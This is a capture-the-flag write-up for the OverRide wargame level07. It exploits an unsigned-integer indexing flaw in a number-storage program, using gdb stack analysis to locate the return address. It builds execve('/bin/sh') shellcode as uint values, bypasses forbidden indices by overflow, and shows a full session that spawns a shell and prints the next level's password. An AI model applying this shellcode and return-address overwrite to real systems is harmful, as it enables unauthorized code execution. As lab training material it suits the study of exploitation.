***
```
   level07@OverRide:~$ ./level07
   ----------------------------------------------------
   Welcome to wil's crappy number storage service!
   ----------------------------------------------------
   Commands:
      store - store a number into the data storage
      read  - read a number from the data storage
      quit  - exit the program
   ----------------------------------------------------
      wil has reserved some storage :>
   ----------------------------------------------------

   Input command: store
   Number: 132
   Index: 4
   Completed store command successfully
   Input command: read
   Index: 4
   Number at data[4] is 132
   Completed read command successfully
   Input command: read
   Index: 1
   Number at data[1] is 0
   Completed read command successfully
   Input command: read
   Index: 9999999999999999999999999999999999
   Number at data[4294967295] is 0
   Completed read command successfully
   Input command: store
   Number: 999999999999999999999999999999999
   Index: 2
   Completed store command successfully
   Input command: read
   Index: 2
   Number at data[2] is 4294967295
   Completed read command successfully
   Input command: quit
```
***

   level07@OverRide:~$ gdb level07
   Non-debugging symbols:
   0x0804842c  _init
   0x08048470  printf
   0x08048470  printf@plt
   0x08048480  fflush
   0x08048480  fflush@plt
   0x08048490  getchar
   0x08048490  getchar@plt
   0x080484a0  fgets
   0x080484a0  fgets@plt
   0x080484b0  __stack_chk_fail
   0x080484b0  __stack_chk_fail@plt
   0x080484c0  puts
   0x080484c0  puts@plt
   0x080484d0  __gmon_start__
   0x080484d0  __gmon_start__@plt
   0x080484e0  __libc_start_main
   0x080484e0  __libc_start_main@plt
   0x080484f0  memset
   0x080484f0  memset@plt
   0x08048500  __isoc99_scanf
   0x08048500  __isoc99_scanf@plt
   0x08048510  _start
   0x08048540  __do_global_dtors_aux
   0x080485a0  frame_dummy
   0x080485c4  clear_stdin
   0x080485e7  get_unum
   0x0804861f  prog_timeout
   0x08048630  store_number
   0x080486d7  read_number
   0x08048723  main
   0x08048a00  __libc_csu_init
   0x08048a70  __libc_csu_fini
   0x08048a72  __i686.get_pc_thunk.bx
   0x08048a80  __do_global_ctors_aux
   0x08048aac  _fini
   (gdb)

***

With this information as well as analysis of assembler dump of functions we can say that:
 
 * All numbers are read with scanf as a uint into data array. Therefore index can be used to move on stack beyond 100 uints and rewrite the return address of main function 

 * At the start of the program all arguments and env variables are deleted. This prevents us from storing shellcode in an env variable as we did before 

* All 3rd indeces are forbidden which is troublesome for writing anything consecutive into the array. But this can be bypassed with uint overflow as pointer arithmetic is used for accessing the array

So the initial plan is to store shellcode in the data array and overwrite eip to jump to our shellcode

For this let's get eip and array addresses on stack:

***

   (gdb) b main
   Breakpoint 1 at 0x8048729
   (gdb) r
   Starting program: /home/users/level07/level07

   Breakpoint 1, 0x08048729 in main ()
   (gdb) info frame
   Stack level 0, frame at 0xffffd710:
   eip = 0x8048729 in main; saved eip 0xf7e45513
   Arglist at 0xffffd708, args:
   Locals at 0xffffd708, Previous frame's sp is 0xffffd710
   Saved registers:
   ebp at 0xffffd708, eip at 0xffffd70c   # eip at 0xffffd70c -  address eip is saved at = main return address

  ***
```
   # Let's find where array is located

   (gdb) b read_number
   Breakpoint 1 at 0x80486dd
   (gdb) r
   Starting program: /home/users/level07/level07
   ----------------------------------------------------
   Welcome to wil's crappy number storage service!
   ----------------------------------------------------
   Commands:
      store - store a number into the data storage
      read  - read a number from the data storage
      quit  - exit the program
   ----------------------------------------------------
      wil has reserved some storage :>
   ----------------------------------------------------

   Input command: read

   Breakpoint 1, 0x080486dd in read_number ()
   (gdb) x $ebp+0x8              # at this point location of data array is loaded on stack in read_number function
   0xffffd520:     0xffffd544    # 0xffffd544 - array address (altered by gdb with env variables); 0xffffd520 - its place on stack
```
***

   (gdb) p 0xffffd70c - 0xffffd544     # offset in main of saved return address from the array
   $1 = 456
   (gdb) p 456 / 4                     # divide by step in the array (uint is 4 bytes)
   $2 = 114                            # index of eip in data array
   
   (gdb) p 0xffffd544 - 0xffffd520     # offset between the array and its address pushed on stack 
   $4 = 36

***

Rip Index: 114 % 3 = 0 -> This index is forbidden but we know how to solve this

Runtime array address index: -36 / 4 = -9

To put shellcode into the array we need to translate it into uints (each 4 bytes long):
Shellcode for `execve("/bin/sh")` from [here](https://shell-storm.org/shellcode/files/shellcode-575.html): "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

hex      | \x6a\x0b\x58\x99  | \x52\x68\x2f\x2f  | \x73\x68\x68\x2f  | \x62\x69\x6e\x89  | \xe3\x31\xc9\xcd    | /x80
4bytes   | 0x99580b6a        | 0x2f2f6852        | 0x2f686873        | 0x896e6962        | 0xcdc931e3          | 0x80
uint     | 2572684138        | 791636050         | 795371635         | 2305714530        | 3452514787          | 128

To put shellcode at the beginning indeces of the array (0-5) we need to get around forbidden ones (0, 3).
For this we use uint overflow:

2**(32) overflows to 0: 
(2**(32) / 4) % 3 = 1 

- Index 0: (2**(32)) / 4 = 1073741824
- Index 3: (2**(32) + (3 * 4)) / 4 = 1073741827
 
To store runtime array address at eip we also has to use this trick:

- Index 114: (2^(32) + (114 * 4)) / 4 = 1073741938

***
```
   level07@OverRide:~$ ./level07
   ----------------------------------------------------
   Welcome to wil's crappy number storage service!
   ----------------------------------------------------
   Commands:
      store - store a number into the data storage
      read  - read a number from the data storage
      quit  - exit the program
   ----------------------------------------------------
      wil has reserved some storage :>
   ----------------------------------------------------

   Input command: store
   Number: 2572684138
   Index: 1073741824
   Completed store command successfully
   Input command: store
   Number: 791636050
   Index: 1
   Completed store command successfully
   Input command: store
   Number: 795371635
   Index: 2
   Completed store command successfully
   Input command: store
   Number: 2305714530
   Index: 1073741827
   Completed store command successfully
   Input command: store
   Number: 3452514787
   Index: 4
   Completed store command successfully
   Input command: store
   Number: 128
   Index: 5
   Completed store command successfully
   Input command: read
   Index: -9
   Number at data[4294967287] is 4294956388
   Completed read command successfully
   Input command: store
   Number: 4294956388
   Index: 1073741938
   Completed store command successfully
   Input command: quit
   $ whoami
   level08
   $ cat /home/users/level08/.pass
   7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```